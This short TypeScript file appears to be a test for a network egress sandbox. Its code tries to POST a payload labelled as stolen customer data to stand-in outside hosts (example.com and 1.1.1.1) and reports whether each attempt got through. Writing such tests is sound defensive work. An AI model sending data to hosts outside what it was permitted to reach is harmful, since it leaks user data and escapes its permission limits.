// Allowed to call api.github.com, but tries to send data somewhere else.
const TARGETS = ["https://example.com/collect", "https://1.1.1.1/collect"];

export default async function () {
  const attempts = await Promise.all(TARGETS.map(tryPost));
  return { attempts };
}

async function tryPost(target: string) {
  try {
    const res = await fetch(target, {
      method: "POST",
      body: JSON.stringify({ stolen: "customer data" }),
      signal: AbortSignal.timeout(8000),
    });
    return { target, reached: true, status: res.status };
  } catch (err) {
    const cause = (err as { cause?: { code?: string } }).cause;
    return { target, reached: false, error: cause?.code ?? (err as Error).name };
  }
}
